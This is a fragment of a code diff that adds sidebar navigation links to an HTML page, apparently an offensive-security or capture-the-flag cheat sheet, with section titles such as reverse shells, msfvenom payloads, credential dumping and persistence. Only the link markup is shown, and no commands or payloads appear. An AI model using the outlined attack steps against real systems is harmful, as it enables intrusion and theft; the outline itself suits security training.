+<a href="#12-autorecon-full-automation" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>1.2 AutoRecon (Full Automation)</a>
+<a href="#phase-2-service-enumeration-deep-dive" class="sb-item" style="font-size:10px;"><span class="sb-icon" style="color:var(--muted)">▸</span>Phase 2 — Service Enumeration Deep Dive</a>
+<a href="#21-ftp-port-21" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>2.1 FTP (Port 21)</a>
+<a href="#22-ssh-port-22" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>2.2 SSH (Port 22)</a>
+<a href="#23-smtp-port-25" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>2.3 SMTP (Port 25)</a>
+<a href="#24-dns-port-53" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>2.4 DNS (Port 53)</a>
+<a href="#25-smb-port-445" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>2.5 SMB (Port 445)</a>
+<a href="#26-snmp-port-161-udp" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>2.6 SNMP (Port 161 UDP)</a>
+<a href="#27-nfs-port-2049" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>2.7 NFS (Port 2049)</a>
+<a href="#28-ldap-port-389636" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>2.8 LDAP (Port 389/636)</a>
+<a href="#29-redis-port-6379" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>2.9 Redis (Port 6379)</a>
+<a href="#210-mysql-port-3306" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>2.10 MySQL (Port 3306)</a>
+<a href="#211-postgresql-port-5432" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>2.11 PostgreSQL (Port 5432)</a>
+<a href="#phase-3-web-application-attacks" class="sb-item" style="font-size:10px;"><span class="sb-icon" style="color:var(--muted)">▸</span>Phase 3 — Web Application Attacks</a>
+<a href="#31-directory-file-fuzzing" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>3.1 Directory & File Fuzzing</a>
+<a href="#32-parameter-fuzzing" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>3.2 Parameter Fuzzing</a>
+<a href="#33-sql-injection" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>3.3 SQL Injection</a>
+<a href="#34-lfi-path-traversal" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>3.4 LFI / Path Traversal</a>
+<a href="#35-file-upload-bypass" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>3.5 File Upload Bypass</a>
+<a href="#36-ssrf" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>3.6 SSRF</a>
+<a href="#37-command-injection" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>3.7 Command Injection</a>
+<a href="#38-ssti-server-side-template-injection" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>3.8 SSTI (Server-Side Template Injection)</a>
+<a href="#39-xss-cookie-stealing" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>3.9 XSS / Cookie Stealing</a>
+<a href="#310-xxe" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>3.10 XXE</a>
+<a href="#phase-4-exploitation-initial-access" class="sb-item" style="font-size:10px;"><span class="sb-icon" style="color:var(--muted)">▸</span>Phase 4 — Exploitation & Initial Access</a>
+<a href="#41-reverse-shells" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>4.1 Reverse Shells</a>
+<a href="#42-listeners" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>4.2 Listeners</a>
+<a href="#43-msfvenom-payloads" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>4.3 MSFVenom Payloads</a>
+<a href="#44-password-attacks" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>4.4 Password Attacks</a>
+<a href="#45-searchsploit-public-exploits" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>4.5 Searchsploit & Public Exploits</a>
+<a href="#phase-5-post-exploitation-stabilization" class="sb-item" style="font-size:10px;"><span class="sb-icon" style="color:var(--muted)">▸</span>Phase 5 — Post-Exploitation & Stabilization</a>
+<a href="#51-shell-stabilization-critical" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>5.1 Shell Stabilization (Critical!)</a>
+<a href="#52-file-transfer" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>5.2 File Transfer</a>
+<a href="#53-situational-awareness" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>5.3 Situational Awareness</a>
+<a href="#phase-6-linux-privilege-escalation" class="sb-item" style="font-size:10px;"><span class="sb-icon" style="color:var(--muted)">▸</span>Phase 6 — Linux Privilege Escalation</a>
+<a href="#61-automated-enumeration" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>6.1 Automated Enumeration</a>
+<a href="#62-suid-sgid-binaries" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>6.2 SUID / SGID Binaries</a>
+<a href="#63-sudo-abuse" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>6.3 Sudo Abuse</a>
+<a href="#64-writable-files-cron-jobs" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>6.4 Writable Files & Cron Jobs</a>
+<a href="#65-capabilities" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>6.5 Capabilities</a>
+<a href="#66-kernel-exploits" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>6.6 Kernel Exploits</a>
+<a href="#67-docker-escape" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>6.7 Docker Escape</a>
+<a href="#68-path-hijacking" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>6.8 PATH Hijacking</a>
+<a href="#69-nfs-root-squashing" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>6.9 NFS Root Squashing</a>
+<a href="#610-wildcard-injection" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>6.10 Wildcard Injection</a>
+<a href="#611-library-hijacking" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>6.11 Library Hijacking</a>
+<a href="#phase-7-persistence-loot" class="sb-item" style="font-size:10px;"><span class="sb-icon" style="color:var(--muted)">▸</span>Phase 7 — Persistence & Loot</a>
+<a href="#71-user-flag" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>7.1 User Flag</a>
+<a href="#72-root-flag" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>7.2 Root Flag</a>
+<a href="#73-credential-dumping" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>7.3 Credential Dumping</a>
+<a href="#74-persistence" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>7.4 Persistence</a>
+<a href="#wordlists-resources" class="sb-item" style="font-size:10px;"><span class="sb-icon" style="color:var(--muted)">▸</span>Wordlists & Resources</a>
+<a href="#wordlists-seclists" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>Wordlists (SecLists)</a>
+<a href="#key-references" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>Key References</a>
+<a href="#one-liners-tricks" class="sb-item" style="font-size:10px;"><span class="sb-icon" style="color:var(--muted)">▸</span>One-Liners & Tricks</a>
+
+      </div>`,
+  });
+</script>
+</body>
+</html>
